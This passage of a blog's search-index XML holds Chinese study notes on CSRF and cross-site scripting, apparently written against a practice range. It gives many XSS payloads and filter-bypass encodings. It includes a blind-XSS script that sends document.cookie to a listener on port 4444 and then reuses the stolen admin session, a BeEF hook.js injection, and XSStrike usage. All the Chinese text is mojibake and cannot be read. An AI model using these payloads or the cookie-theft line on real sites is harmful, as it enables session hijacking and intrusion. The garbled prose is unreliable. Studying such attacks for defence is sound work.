Refereråæ˜¯å¦ä»ç„¶å¯ä»¥æäº¤æˆåŠŸ</li></ol><p>b.ç½‘ç«™å¯ä»¥å…è®¸å†™å…¥csrf payload</p><ol><li>æµ‹è¯•ç”¨æˆ·å¤´åƒ<code>&lt;img&gt;</code> &#x2F; å¯Œæ–‡æœ¬åŒºåŸŸçš„<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code>æ ‡ç­¾(å¯æ§)</li><li>æ’å…¥payload</li></ol><p>æŒ–æ˜æ€è·¯:<br>1.æ˜¯å¦å­˜åœ¨tokenå’ŒéªŒè¯ç ,æ˜¯å¦å¯ä»¥åˆ é™¤æˆ–ä¼ªé€ <br>2.æ˜¯å¦å¯ä»¥åˆ é™¤æˆ–ä¼ªé€ referer<br>3.&lt;img&gt;&#x2F;&lt;svg&gt;ç­‰æ ‡ç­¾é“¾æ¥æ˜¯å¦å¯æ§</p><p>å¸¸è§æ¼æ´ç‚¹<br>1.ä¿®æ”¹å¯†ç  2.ä¿®æ”¹ä¸ªäººä¿¡æ¯ 3.å‘å¸ƒæ–‡ç«  4.ä¸è´¦å·ç›¸å…³çš„å¤§éƒ¨åˆ†ä¸šåŠ¡åŠŸèƒ½ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSåŸºç¡€</title>
      <link href="/2023/07/09/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/09/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="XSSåŸºç¡€"><a href="#XSSåŸºç¡€" class="headerlink" title="XSSåŸºç¡€"></a>XSSåŸºç¡€</h1><h2 id="1-XSSç§ç±»ï¼š"><a href="#1-XSSç§ç±»ï¼š" class="headerlink" title="1.XSSç§ç±»ï¼š"></a>1.XSSç§ç±»ï¼š</h2><p>åå°„ï¼ˆä¸»åŠ¨è§¦å‘<br>domï¼ˆä¸»åŠ¨è§¦å‘<br>å­˜å‚¨å‹ï¼ˆè¢«åŠ¨è§¦å‘</p><h3 id="1-1-åå°„å‹"><a href="#1-1-åå°„å‹" class="headerlink" title="1.1.åå°„å‹"></a>1.<strong>1.åå°„å‹</strong></h3><p><strong>GETå‹</strong><br>åˆ›é€ ä¸€è§¦å‘xssçš„é¡µé¢åè®©å…¶ä»–ç”¨æˆ·ç‚¹å‡»</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?message = <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?meseage = <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>POSTå‹</strong><br>åœ¨post dateé‡Œè¾“å…¥æ”»å‡»ä»£ç </p><h3 id="1-2-å­˜å‚¨å‹"><a href="#1-2-å­˜å‚¨å‹" class="headerlink" title="1.2.å­˜å‚¨å‹"></a><strong>1.2.å­˜å‚¨å‹</strong></h3><p>ä¸€èˆ¬ä¼šæŠŠä»£ç æ”¾åœ¨æ•°æ®åº“ä¸­ï¼Œå±å®³å¾ˆå¤§<br>æ¯ä¸ªç‚¹å‡»çš„ç”¨æˆ·éƒ½ä¼šè¢«åŠ¨è§¦å‘<br>å¤šç•™è¨€æ¿ã€å¼¹å¹•ã€è®ºå›</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>aha</span><br></pre></td></tr></table></figure><h3 id="1-3-DOMå‹"><a href="#1-3-DOMå‹" class="headerlink" title="1.3.DOMå‹"></a>1.<strong>3.DOMå‹</strong></h3><p>domå‹<br>å’Œjsæœ‰äº’åŠ¨<br>DOM-xss-1<br>ç”¨jså’Œå‰ç«¯è¿›è¡Œäº’åŠ¨</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³•ä¸€<br>é—­åˆå†™æ–°æ ‡ç­¾</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">herf</span> = <span class="string">&#x27;#&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span> &#x27;&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span> = <span class="string">&quot;alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³•äºŒ<br>javascriptåè®®</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DOM-xss-x<br>è¾“å…¥ä¸€ä¸ªå‚æ•°ä¼šè¢«é¡µé¢ä¸Šçš„æŸäº›jså‡½æ•°è¿›è¡Œå¤„ç†ï¼Œå¤„ç†åå†æ˜¾ç¤ºåˆ°é¡µé¢<br>è¿™ç§æƒ…å†µéœ€è¦å¯¹jså¤„ç†å‡½æ•°è¿›è¡Œåˆ†æ,æ„é€ payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">if</span>=<span class="string">&quot;xssd_main&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function domxss()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var str = window.location.search;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var xss = txss.replace(/\+/g,&#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            alert(xss);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.getElementById(&quot;dom&quot;).innerHTML = &quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+xss+&quot;&#x27;</span>&gt;</span>å°±è®©å¾€äº‹éšé£å§ï¼Œéƒ½éšé£å§<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//payload   </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">#&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onmouseover</span> = <span class="string">&quot;alert(1)&quot;</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">&lt;<span class="attr">a</span> <span class="attr">href</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;domxss()&#x27;</span>&gt;</span>æœ‰äº›è´¹å°½å¿ƒæœºæƒ³è¦å¿˜è®°çš„äº‹æƒ…,åæ¥çœŸçš„å°±å¿˜æ‰äº†<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h3 id="XSSç›²æ‰“"><a href="#XSSç›²æ‰“" class="headerlink" title="XSSç›²æ‰“"></a>XSSç›²æ‰“</h3><p>çŒœæµ‹æ‰“åç«¯<br>nc -lvp 4444 è®©ncç›‘å¬4444ç«¯å£<br>è®©ncç›‘å¬4444ç«¯å£ ä½¿ç”¨jsåœ¨å‰ç«¯ï¼Œåˆ›å»ºâ¼€ä¸ªimgæ ‡ç­¾ï¼Œé“¾æ¥åœ°å€æ˜¯<a href="http://127.0.0.1:4444/haha?%E7%AE%A1%E7%90%86%E5%91%98cookie%E5%86%85%E5%AE%B9">http://127.0.0.1:4444/haha?ç®¡ç†å‘˜cookieå†…å®¹</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var img = document.createElement(&quot;img&quot;);img.src=&quot;http://127.0.0.1:4444/ haha?&quot;+escape(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>haha?åâ¾¯æ˜¯ ant%5Buname%5D%3Dadmin%3B%20ant%5Bpw%5D%3D10470c3b4b1fed12c3baac014be15fac67 c6e815%3B%20PHPSESSID%3D7gs14u95sj83rprra2jtnekgk7</p><p>è§£ç å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /haha?ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=40m1vhef8ovjan1ojec5vgs8ln HTTP/1.1</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç®¡ç†å‘˜çš„cookie<br>å‘ç°referer <a href="http://127.0.0.1/vul/xss/xssblind/admin.php">http://127.0.0.1/vul/xss/xssblind/admin.php</a> ä¹Ÿå°±æ˜¯ä¾¦æµ‹åˆ°äº†ç®¡ç†å‘˜ç™»å½•åœ°å€<br>åœ¨burpé‡Œè®¿é—®<a href="http://127.0.0.1/vul/xss/xssblind/admin.php%E6%8A%93%E5%8C%85%EF%BC%8Ccookie%E4%BF%AE%E6%94%B9%E4%B8%BA%E6%8A%93%E5%88%B0%E7%9A%84cookie%EF%BC%8C%E5%B0%B1%E5%8F%AF">http://127.0.0.1/vul/xss/xssblind/admin.phpæŠ“åŒ…ï¼Œcookieä¿®æ”¹ä¸ºæŠ“åˆ°çš„cookieï¼Œå°±å¯</a> ä»¥å…å¯†ç ç™»å½•åå°äº†ã€‚</p><h2 id="2-XSSpayloadæ„é€ "><a href="#2-XSSpayloadæ„é€ " class="headerlink" title="2.XSSpayloadæ„é€ "></a>2.XSSpayloadæ„é€ </h2><h3 id="2-1å¸¸ç”¨æ ‡ç­¾"><a href="#2-1å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="2.1å¸¸ç”¨æ ‡ç­¾"></a>2.1å¸¸ç”¨æ ‡ç­¾</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br><span class="line">&lt;body onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div onclick=&quot;alert(1)&quot;&gt;h&lt;/div&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class="line">&lt;object onclick=&quot;alert(1)&quot;&gt;123&lt;/object&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;alert(1)&quot; autofocus&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(1)&quot;&gt;click!&lt;/button&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2å¸¸ç”¨onäº‹ä»¶"><a href="#2-2å¸¸ç”¨onäº‹ä»¶" class="headerlink" title="2.2å¸¸ç”¨onäº‹ä»¶"></a>2.2å¸¸ç”¨onäº‹ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">onclick=ç‚¹å‡»è§¦å‘</span><br><span class="line">onload=åŠ è½½è§¦å‘</span><br><span class="line">onerror=æŠ¥é”™è§¦å‘</span><br><span class="line">onfocus=è·å¾—ç„¦ç‚¹è§¦å‘</span><br><span class="line">onblur=å¤±å»ç„¦ç‚¹è§¦å‘</span><br><span class="line">onmouseover=é¼ æ ‡æ‚¬åœ</span><br><span class="line">onkeydown= onkeypress= onkeyup=  é”®ç›˜æ“ä½œè§¦å‘</span><br><span class="line">onchange=å†…å®¹æ”¹å˜è§¦å‘</span><br><span class="line">onscroll=æ»šåŠ¨æ¡æ»šåŠ¨è§¦å‘</span><br></pre></td></tr></table></figure><h3 id="2-3å¸¸ç”¨æµ‹è¯•å‡½æ•°"><a href="#2-3å¸¸ç”¨æµ‹è¯•å‡½æ•°" class="headerlink" title="2.3å¸¸ç”¨æµ‹è¯•å‡½æ•°"></a>2.3å¸¸ç”¨æµ‹è¯•å‡½æ•°</h3><p>srcæŒ–æ˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log()</span><br></pre></td></tr></table></figure><p>å¼¹çª—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert()</span><br><span class="line">confirm()</span><br><span class="line">prompt()</span><br></pre></td></tr></table></figure><h2 id="4-å¸¸ç”¨ç»•è¿‡æ–¹å¼"><a href="#4-å¸¸ç”¨ç»•è¿‡æ–¹å¼" class="headerlink" title="4.å¸¸ç”¨ç»•è¿‡æ–¹å¼"></a>4.å¸¸ç”¨ç»•è¿‡æ–¹å¼</h2><p>1.å¤§å°å†™ç»•è¿‡<br>å¤–éƒ¨æ ‡ç­¾æ— è§†å¤§å°å†™ï¼Œå†…éƒ¨çš„jsä»£ç æ˜¯å¤§å°å†™æ•æ„Ÿçš„</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scRiPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.åŒå†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure><p>3.æ³¨é‡Šç»•è¿‡</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    --&gt;</span></span><br><span class="line">&lt;scr<span class="comment">&lt;!-- abc --&gt;</span>ipt&gt;alert<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.è¿‡æ»¤åœ†æ‹¬å·(),ç”¨åå¼•å·``æ›¿ä»£</p><p>5.ä½¿ç”¨svgå®ä½“å­—ç¬¦ç¼–ç </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6.æ¢è¡Œé€ƒé€¸jsåŒ¹é…</p><p>7.å•æ ‡ç­¾ä¸å†™å³æ ‡ç­¾</p><p>8.è¾“å…¥å†…å®¹å…¨å¤§å†™- è¿œç¨‹js</p><p>9.ä½¿ç”¨é•¿è‹±è¯­ç»•è¿‡</p><p>10.ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;() å°è¯•å•è¯æˆ–å¤šæ¬¡urlç¼–ç </span><br><span class="line">&quot;[å†…å®¹]&quot; åŒå¼•å·çš„å†…å®¹å°è¯•unicodeç¼–ç </span><br><span class="line">base64ç¼–ç </span><br><span class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</span><br><span class="line">unicode</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>11.payloadé•¿åº¦å—é™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.çŸ­åŸŸå</span><br><span class="line">2.&lt;svg/onload=alert(1)</span><br></pre></td></tr></table></figure><p>12.jQueryæˆªæ–­ç»•è¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$ms = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">$(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmacç¡®å®å‰å®³&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//alert($ms);</span></span><br><span class="line">$(<span class="string">&#x27;fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abc = <span class="string">&#x27;;alert(1);//</span></span><br><span class="line"><span class="string">$ms = &#x27;</span><span class="string">&#x27;;alert(1);//&#x27;</span>;</span><br><span class="line">abc = <span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(1)//</span></span><br></pre></td></tr></table></figure><h2 id="5-XSSå±å®³ä¸é˜²å¾¡"><a href="#5-XSSå±å®³ä¸é˜²å¾¡" class="headerlink" title="5.XSSå±å®³ä¸é˜²å¾¡"></a>5.XSSå±å®³ä¸é˜²å¾¡</h2><p>XSSå±å®³</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç›—å–cookie</span><br><span class="line"></span><br><span class="line">æ¤å…¥é”®ç›˜è®°å½•å™¨ã€‚</span><br><span class="line"></span><br><span class="line">æ”»å‡»å—å®³è€…æ‰€åœ¨çš„å±€åŸŸç½‘ã€‚</span><br><span class="line"></span><br><span class="line">ä»£ç†è½¬å‘æµç»è¢«æ”»å‡»è€…çš„æ‰€æœ‰ Web æµé‡ï¼Œå³å®æ–½ä¸­é—´äººæ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">çªƒå–æˆ–ç¯¡æ”¹åº”ç”¨ cookie ç”¨äºä¼šè¯åŠ«æŒã€‚</span><br><span class="line"></span><br><span class="line">æ›´æ”¹è¢«æ”»å‡»è€… Web åº”ç”¨çš„æ˜¾ç¤ºå†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">ç»•è¿‡ CSRF å®‰å…¨é˜²æŠ¤æªæ–½ã€‚</span><br><span class="line"></span><br><span class="line">åˆ›å»ºåŒ…å«æ¶æ„ JavaScript ä»£ç çš„è™šå‡ç½‘ç«™ä»¥åŠåˆ°è¯¥ç½‘ç«™é¡µé¢çš„é“¾æ¥ã€‚</span><br><span class="line"></span><br><span class="line">å‘é€åµŒå…¥æ¶æ„ Web URL çš„ç”µå­é‚®ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ URL çŸ­ç éšè”½çœŸå® URLã€‚</span><br></pre></td></tr></table></figure><p>XSSé˜²å¾¡<br><a href="https://zhuanlan.zhihu.com/p/262038810">https://zhuanlan.zhihu.com/p/262038810</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htmlå›æ˜¾å†…å®¹åœ¨htmlé¡µé¢æ ‡ç­¾ä¹‹å¤–æ—¶ï¼Œå®ä½“åŒ–å·¦å³å°–æ‹¬å·</span><br><span class="line">htmlå›æ˜¾å†…å®¹åœ¨&lt;script&gt;ä»£ç å¿«æ—¶ï¼Œå®ä½“åŒ–å·¦å³å°–æ‹¬å·ã€â€œ/â€ã€å•å¼•å·ç­‰å¯èƒ½é—­åˆæ ‡ç­¾çš„å­—ç¬¦</span><br><span class="line">htmlå›æ˜¾å†…å®¹é€šè¿‡postmessageä½œä¸ºè¾“å…¥ç‚¹æ—¶ æ£€æµ‹messageEventçš„æ¥æºæ˜¯å¦åœ¨ç™½åå•å†…ï¼ŒåŒæ—¶æ£€æµ‹æ¥æºæ•°æ®æ˜¯å¦åˆæ³•ï¼Œæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç </span><br></pre></td></tr></table></figure><h2 id="6-XSSå¹³å°"><a href="#6-XSSå¹³å°" class="headerlink" title="6.XSSå¹³å°"></a>6.XSSå¹³å°</h2><h3 id="1-beef-xsss"><a href="#1-beef-xsss" class="headerlink" title="1.beef-xsss"></a>1.beef-xsss</h3><h4 id="1-å®‰è£…ç™»å½•"><a href="#1-å®‰è£…ç™»å½•" class="headerlink" title="1.å®‰è£…ç™»å½•"></a>1.å®‰è£…ç™»å½•</h4><p>å®‰è£…beef-xss</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">beef-xss ä¹‹åé»˜è®¤èµ°æµç¨‹</span><br><span class="line">beef-xssæ‰“å¼€</span><br><span class="line">åœ¨<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>/ui/authenticationç™»å½•</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223197067-3b5f5014-f727-4761-9c44-495d2a0dd65e.png" alt="img"><br>é»˜è®¤ç”¨æˆ·åbeef å¯†ç pass</p><h4 id="2-ä½¿ç”¨"><a href="#2-ä½¿ç”¨" class="headerlink" title="2.ä½¿ç”¨"></a>2.ä½¿ç”¨</h4><p>src è¿æ¥åˆ°æœ¬åœ°beef-xss</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.89.129:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223181699-334b0ee1-00f2-468c-a4b7-f64c46fc4417.png" alt="img"></p><p>è¿è¡Œåbeef-xssä¸Šçº¿<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223164834-f2a1e17b-c8d1-41c6-924c-b65ceda7bcf2.png" alt="img"></p><p>æ‰¾åˆ°å¯¹æ–¹çš„å‰ç«¯ä»£ç ï¼Œç„¶åæ’å…¥è‡ªå·±çš„jsæ”»å‡»ä»£ç <br>Current Browser â†’ Commands å¯ä»¥è¿è¡Œå¤šç§å‘½ä»¤<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223147867-341bd077-d720-4ce0-978f-eba26b409929.png" alt="img"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223117642-f6634562-864c-46f2-8cf2-4e98c1eb5a1b.png" alt="img"><br>ä¸Šçº¿çš„æµè§ˆå™¨ä¼šå¼¹çª—</p><h3 id="2-xss-pt"><a href="#2-xss-pt" class="headerlink" title="2.xss.pt"></a>2.xss.pt</h3><p><a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a><br>åˆ›å»ºé¡¹ç›®<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101339963.png" alt="img"><br>é€‰æ‹©ç›¸åº”æ¨¡å¼åä¼šè¿”å›payload<br>å°†payloadè¿è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101345101.png" alt="img"></p><h2 id="7-å¸¸ç”¨å·¥å…·æ¨è"><a href="#7-å¸¸ç”¨å·¥å…·æ¨è" class="headerlink" title="7.å¸¸ç”¨å·¥å…·æ¨è"></a>7.å¸¸ç”¨å·¥å…·æ¨è</h2><h3 id="1-XSStrike"><a href="#1-XSStrike" class="headerlink" title="1.XSStrike"></a>1.XSStrike</h3><p>é¡¹ç›®åœ°å€:<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python xsstrike.<span class="property">py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">usage</span>: xsstrike.<span class="property">py</span> [-h] [-u <span class="variable constant_">TARGET</span>] [--data <span class="variable constant_">DATA</span>] [-t <span class="variable constant_">THREADS</span>] [--seeds <span class="variable constant_">SEEDS</span>] [--json] [--path]</span><br><span class="line">                   [--fuzzer] [--update] [--timeout] [--params] [--crawl] [--blind]</span><br><span class="line">                   [--skip-dom] [--headers] [--proxy] [-d <span class="variable constant_">DELAY</span>] [-e <span class="variable constant_">ENCODING</span>]</span><br><span class="line"> </span><br><span class="line">optional <span class="attr">arguments</span>:</span><br><span class="line">  -h, --help            show <span class="variable language_">this</span> help message and exit</span><br><span class="line">  -u, --url             target url</span><br><span class="line">  --data                post data</span><br><span class="line">  -f, --file            load payloads <span class="keyword">from</span> a file</span><br><span class="line">  -t, --threads         number <span class="keyword">of</span> threads</span><br><span class="line">  -l, --level           level <span class="keyword">of</span> crawling</span><br><span class="line">  -t, --encode          payload encoding</span><br><span class="line">  --json                treat post data <span class="keyword">as</span> json</span><br><span class="line">  --path                inject payloads <span class="keyword">in</span> the path</span><br><span class="line">  --seeds               load urls <span class="keyword">from</span> a file <span class="keyword">as</span> seeds</span><br><span class="line">  --fuzzer              fuzzer</span><br><span class="line">  --update              update</span><br><span class="line">  --timeout             timeout</span><br><span class="line">  --params              find params</span><br><span class="line">  --crawl               crawl</span><br><span class="line">  --proxy               use <span class="title function_">prox</span>(y|ies)</span><br><span class="line">  --blind               inject blind xss payloads <span class="keyword">while</span> crawling</span><br><span class="line">  --skip                skip confirmation dialogue and poc</span><br><span class="line">  --skip-dom            skip dom checking</span><br><span class="line">  --headers             add headers</span><br><span class="line">  -d, --delay           delay between requests</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æµ‹è¯•<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223759798-7958204d-4fe7-4f6c-b944-0c3202e1805b.png" alt="img"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1680223974291-82291116-d3ea-47cb-9cee-df14ca0433ef.png" alt="img"></p><h3 id="2-XSSpayload"><a href="#2-XSSpayload" class="headerlink" title="2.XSSpayload"></a>2.XSSpayload</h3><p>ä¸€ç§xss fuzzçˆ†ç ´æ–¹å¼<br><a href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload</a><br>æ”¾å…¥payloadçœ‹å¼¹çª—æ•°å­—ç¡®å®špayloadè¡Œæ•°ã€‚</p><h3 id="3-Burpsuite-XSS-Validatoræ’ä»¶"><a href="#3-Burpsuite-XSS-Validatoræ’ä»¶" class="headerlink" title="3.Burpsuite XSS Validatoræ’ä»¶"></a>3.Burpsuite XSS Validatoræ’ä»¶</h3><h4 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1.å®‰è£…"></a>1.å®‰è£…</h4><p>1.phantomjsä¸‹è½½<br><a href="http://phantomjs.org/download.html">http://phantomjs.org/download.html</a><br>å°†phantomjsæ‰€åœ¨çš„binç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡<br>ä¸‹è½½xss.js,å°†å…¶æ”¾åˆ°å’Œphantomjs.exeä¸€ä¸ªç›®å½•ä¸­<br><a href="https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js">https://github.com/NetSPI/xssValidator/blob/master/xss-detector/xss.js</a></p><p>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phantomjs.exe xss.js</span><br></pre></td></tr></table></figure><p>2.å®‰è£…æ’ä»¶<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101352302.png" alt="img"></p><h4 id="2-ä½¿ç”¨-1"><a href="#2-ä½¿ç”¨-1" class="headerlink" title="2.ä½¿ç”¨"></a>2.ä½¿ç”¨</h4><p>1.ç”¨bpæŠ“åŒ…send to intruder<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101428475.png"></p><p>2.é…ç½®å˜é‡<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101430632.png"></p><p>3.é…ç½®GREP-MATCH<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101433439.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307101434106.png"></p><p>4.å¯åŠ¨æ‰«æ<br>å‚è€ƒæ–‡ç« :<br><a href="https://www.freesion.com/article/77561513173/">burpsuiteæ’ä»¶xssValidatorçš„å®‰è£…åŠä½¿ç”¨ï¼ˆXSSè‡ªåŠ¨æ‰«æå·¥å…·ï¼‰</a></p><h2 id="8-å‚è€ƒæ–‡ç« "><a href="#8-å‚è€ƒæ–‡ç« " class="headerlink" title="8.å‚è€ƒæ–‡ç« "></a>8.å‚è€ƒæ–‡ç« </h2><p><a href="https://wiki.sheep0818.xyz/doc/151/">XSS CSRF SSRF</a><br><a href="https://www.52dianzi.com/category/article/37/625025.html">Xss Bypasså¤‡å¿˜å½•</a></p><h2 id="9-é¶åœºç»ƒä¹ "><a href="#9-é¶åœºç»ƒä¹ " 